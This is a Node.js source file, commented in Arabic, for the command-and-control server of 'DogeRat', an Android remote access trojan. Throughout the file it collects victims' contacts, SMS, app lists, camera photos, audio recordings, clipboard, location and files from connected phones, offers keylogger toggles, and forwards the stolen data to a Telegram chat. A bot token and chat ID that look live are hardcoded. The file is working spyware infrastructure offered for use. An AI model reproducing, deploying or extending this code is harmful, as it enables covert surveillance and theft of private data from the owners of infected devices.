const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// ========== إعدادات متغيرات البيئة ==========
const TOKEN = process.env.TOKEN || '8549358187:AAFWADEIpzlmgVsqZZtLn5g3-Ppk4tOpQ0Y';
const CHAT_ID = process.env.CHAT_ID || '7770087246';
const PORT = process.env.PORT || 8080;
const HOST = process.env.HOST || '0.0.0.0';

// ========== إعدادات السيرفر ==========
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        credentials: true
    },
    pingTimeout: 60000, // زيادة وقت الـ ping إلى 60 ثانية
    pingInterval: 25000 // إرسال ping كل 25 ثانية
});

// ========== إعدادات البوت مع إعادة المحاولة ==========
const bot = new telegramBot(TOKEN, { 
    polling: true,
    pollingOptions: {
        timeout: 30,
        limit: 100,
        retryTimeout: 5000
    }
});

// معالجة أخطاء البولينغ
bot.on('polling_error', (error) => {
    console.log('Polling error:', error.code);
    if (error.code === 'ETELEGRAM' || error.code === 'ECONNRESET') {
        console.log('Reconnecting bot...');
        setTimeout(() => {
            try {
                bot.startPolling();
            } catch (e) {
                console.log('Reconnection failed:', e.message);
            }
        }, 5000);
    }
});

// ========== تخزين البيانات ==========
const appData = new Map();
const connectedDevices = new Map();

// ========== إعدادات multer لرفع الملفات ==========
const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 }
});

// ========== إعدادات Express ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== المسارات (Routes) ==========
app.get('/', (req, res) => {
    res.send('✅ DogeRat Server is running!');
});

app.get('/ping', (req, res) => {
    res.send('pong');
});

app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'ok',
        devices: connectedDevices.size,
        uptime: process.uptime()
    });
});

// رفع الملفات
app.post('/upload', upload.single('file'), (req, res) => {
    try {
        const file = req.file;
        const deviceName = req.headers['device-name'] || 'Unknown';
        
        if (!file) {
            return res.status(400).send('No file uploaded');
        }

        bot.sendDocument(CHAT_ID, file.buffer, {
            caption: `📁 File received from: <b>${deviceName}</b>\n📄 Name: <b>${file.originalname}</b>\n📦 Size: <b>${(file.size / 1024).toFixed(2)} KB</b>`,
            parse_mode: 'HTML'
        }, {
            filename: file.originalname,
            contentType: file.mimetype || 'application/octet-stream'
        });

        res.send('✅ File uploaded successfully');
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).send('Upload failed');
    }
});

// ========== أوامر البوت ==========
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== CHAT_ID) {
        bot.sendMessage(chatId, '⛔ Unauthorized access!');
        return;
    }

    bot.sendMessage(CHAT_ID, `
<b>✯ Welcome to DOGERAT</b>

🔴 Real-time control
📱 Android device management
🔐 Advanced features

<b>Developed by: @CYBERSHIELDX</b>
    `, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Devices ✯', '✯ About us ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true
        }
    });
});

bot.onText(/✯ Devices ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== CHAT_ID) return;

    if (connectedDevices.size === 0) {
        bot.sendMessage(CHAT_ID, '<b>✯ There is no connected device</b>', {
            parse_mode: 'HTML'
        });
        return;
    }

    let message = `<b>✯ Connected devices count: ${connectedDevices.size}</b>\n\n`;
    let index = 1;
    const deviceButtons = [];

    for (const [deviceId, device] of connectedDevices) {
        message += `<b>${index}.</b>\n`;
        message += `<b>device</b> → ${device.name}\n`;
        message += `<b>model</b> → ${device.model}\n`;
        message += `<b>ip</b> → ${device.ip}\n`;
        message += `<b>time</b> → ${device.time}\n\n`;
        
        deviceButtons.push([deviceId]);
        index++;
    }

    deviceButtons.push(['✯ All ✯']);
    deviceButtons.push(['✯ Cancel action ✯']);

    bot.sendMessage(CHAT_ID, message, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: deviceButtons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

bot.onText(/✯ All ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== CHAT_ID) return;

    bot.sendMessage(CHAT_ID, '<b>✯ Select action to perform for all available devices</b>', {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Contacts ✯', '✯ SMS ✯'],
                ['✯ Apps ✯', '✯ Main camera ✯'],
                ['✯ Selfie Camera ✯', '✯ Microphone ✯'],
                ['✯ Vibrate ✯', '✯ Toast ✯'],
                ['✯ Clipboard ✯', '✯ Notification ✯'],
                ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

// ========== اتصالات Socket.IO ==========
io.on('connection', (socket) => {
    const deviceName = socket.handshake.headers['device-name'] || 'Unknown';
    const deviceModel = socket.handshake.headers['device-model'] || 'Unknown';
    const deviceIp = socket.handshake.address || 'Unknown';
    const deviceId = socket.id;

    const deviceInfo = {
        id: deviceId,
        name: deviceName,
        model: deviceModel,
        ip: deviceIp,
        time: new Date().toLocaleString()
    };
    connectedDevices.set(deviceId, deviceInfo);

    bot.sendMessage(CHAT_ID, `
<b>✯ New device connected</b>

<b>device</b> → ${deviceName}
<b>model</b> → ${deviceModel}
<b>ip</b> → ${deviceIp}
<b>time</b> → ${new Date().toLocaleString()}
    `, {
        parse_mode: 'HTML'
    });

    socket.on('command', (data) => {
        const { request, extras } = data;
        const device = connectedDevices.get(socket.id);

        switch (request) {
            case 'contacts':
                bot.sendMessage(CHAT_ID, `<b>✯ Contacts received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'sms':
                bot.sendMessage(CHAT_ID, `<b>✯ SMS received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'apps':
                bot.sendMessage(CHAT_ID, `<b>✯ Apps list received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'main-camera':
                bot.sendMessage(CHAT_ID, `<b>✯ Main camera photo received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'selfie-camera':
                bot.sendMessage(CHAT_ID, `<b>✯ Selfie camera photo received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'microphone':
                bot.sendMessage(CHAT_ID, `<b>✯ Audio recording received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'vibrate':
                bot.sendMessage(CHAT_ID, `<b>✯ Device vibrated: ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'toast':
                bot.sendMessage(CHAT_ID, `<b>✯ Toast sent to: ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'clipboard':
                bot.sendMessage(CHAT_ID, `<b>✯ Clipboard received from → ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'notification':
                bot.sendMessage(CHAT_ID, `<b>✯ Notification sent to: ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'keylogger-on':
                bot.sendMessage(CHAT_ID, `<b>✯ Keylogger ON for: ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            case 'keylogger-off':
                bot.sendMessage(CHAT_ID, `<b>✯ Keylogger OFF for: ${device.name}</b>`, { parse_mode: 'HTML' });
                break;
            default:
                console.log('Unknown command:', request);
        }
    });

    socket.on('data', (data) => {
        const { type, content } = data;
        const device = connectedDevices.get(socket.id);

        switch (type) {
            case 'contacts':
                bot.sendDocument(CHAT_ID, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📋 Contacts from: ${device.name}`,
                    filename: `contacts_${device.name}.json`
                });
                break;
            case 'sms':
                bot.sendDocument(CHAT_ID, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `💬 SMS messages from: ${device.name}`,
                    filename: `sms_${device.name}.json`
                });
                break;
            case 'apps':
                bot.sendDocument(CHAT_ID, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📱 Apps from: ${device.name}`,
                    filename: `apps_${device.name}.json`
                });
                break;
            case 'location':
                bot.sendMessage(CHAT_ID, `
📍 <b>Location received from ${device.name}</b>

🌐 Latitude: ${content.lat}
🌐 Longitude: ${content.lng}
🔗 <a href="https://maps.google.com?q=${content.lat},${content.lng}">View on Google Maps</a>
                `, { parse_mode: 'HTML' });
                break;
            case 'clipboard':
                bot.sendMessage(CHAT_ID, `
📋 <b>Clipboard from ${device.name}</b>

${content}
                `, { parse_mode: 'HTML' });
                break;
            default:
                console.log('Unknown data type:', type);
        }
    });

    socket.on('file', (data) => {
        const { filename, content } = data;
        const device = connectedDevices.get(socket.id);
        
        bot.sendDocument(CHAT_ID, Buffer.from(content), {
            caption: `📁 File from: ${device.name}`,
            filename: filename
        });
    });

    socket.on('disconnect', () => {
        const device = connectedDevices.get(socket.id);
        if (device) {
            connectedDevices.delete(socket.id);
            bot.sendMessage(CHAT_ID, `
<b>✯ Device disconnected</b>

<b>device</b> → ${device.name}
<b>model</b> → ${device.model}
<b>time</b> → ${new Date().toLocaleString()}
            `, { parse_mode: 'HTML' });
        }
    });
});

// ========== تشغيل السيرفر ==========
server.listen(PORT, HOST, () => {
    console.log(`✅ Server running on ${HOST}:${PORT}`);
    console.log(`✅ Bot is ready!`);
    console.log(`✅ Connected devices: 0`);
    console.log(`✅ Uptime will be: ${process.uptime()} seconds`);
});

// ========== معالجة الأخطاء ==========
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// ========== إبقاء السيرفر نشطاً (يُفضل استخدام UptimeRobot بدلاً من هذا) ==========
// هذا يحافظ على النشاط لكن الأفضل استخدام خدمة خارجية
console.log('✅ Server is running. Use UptimeRobot to keep it alive.');
